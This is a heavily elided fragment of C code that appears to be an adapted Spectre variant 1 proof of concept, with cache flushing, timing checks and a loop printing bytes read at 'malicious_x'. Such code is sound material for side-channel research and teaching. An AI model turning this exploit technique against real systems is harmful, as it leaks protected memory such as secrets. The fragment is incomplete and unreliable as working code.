...
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	...
	for (tries = 999; tries > 0; tries--)
	{
		...
		training_x = this_temp % array1_size;
		for (j = 29; j >= 0; j--)
		{
			_mm_clflush(&last_x);
		//	_mm_clflush(&array1);
		...
		for (i = 0; i < 256; i++)
		{
			...
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % (int)array1_size])
...
int main(int argc, const char* * argv)
{
	while(1){
		...
		if(in=='r'){
			...
			while (--len >= 0)
			{
			printf("Reading at malicious_x = %p secc= %c ...", (void *)malicious_x, secret[i]);
			++i;
